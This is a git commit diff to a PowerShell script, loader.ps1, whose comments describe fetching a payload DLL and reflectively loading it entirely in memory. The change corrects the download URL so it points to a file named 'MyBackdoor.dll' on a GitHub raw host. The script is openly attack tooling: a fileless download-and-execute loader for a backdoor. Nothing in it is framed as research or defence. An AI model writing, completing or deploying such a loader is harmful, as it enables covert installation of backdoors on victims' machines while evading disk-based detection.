30fd962e4251ab39389828ea011402d858555210
concentratedsulfuricacid <64721678+concentratedsulfuricacid@users.noreply.github.com>
2025-07-13 18:23:29 +0800

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -2,7 +2,7 @@
 # Fetches and reflectively loads payload.dll entirely in memory
 
 # 1) URL of your hosted payload DLL
-$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/blob/main/MyBackdoor.dl'
+$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/blob/main/MyBackdoor.dll'
 Write-Host "[+] Downloading payload from $payloadUrl"
 
 # 2) Download raw DLL bytes
